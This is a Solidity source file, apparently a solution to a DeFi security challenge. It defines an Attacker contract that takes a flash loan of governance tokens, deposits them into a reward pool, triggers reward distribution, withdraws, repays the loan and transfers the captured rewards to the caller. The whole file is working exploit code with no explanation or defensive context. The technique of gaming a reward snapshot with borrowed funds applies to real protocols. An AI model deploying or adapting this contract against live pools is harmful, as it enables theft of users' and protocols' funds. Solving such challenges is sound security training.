// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface ILoan {
    function flashLoan(uint256 borrowAmount) external;

    function deposit() external payable;

    function withdraw() external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface IERC {
    function balanceOf(address borrower) external view returns (uint256);

    function approve(address spender, uint amount) external;

    function transfer(address to, uint amount) external;

    function transferFrom(address who, address spender, uint amount) external;
}

contract Attacker {
    ILoan flashloan;
    IRewardPool rewardPool;
    IERC dvtToken;
    IERC reward;

    constructor(
        address _victimContract,
        address _rewardPool,
        address dvt,
        address _reward
    ) {
        flashloan = ILoan(_victimContract);
        rewardPool = IRewardPool(_rewardPool);
        dvtToken = IERC(dvt);
        reward = IERC(_reward);
    }

    function receiveFlashLoan(uint amount) external {
        dvtToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.distributeRewards();
        rewardPool.withdraw(amount);
        dvtToken.transfer(address(flashloan), amount);
    }

    function attackFlashloan() public {
        flashloan.flashLoan(1_000_000e18);
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}
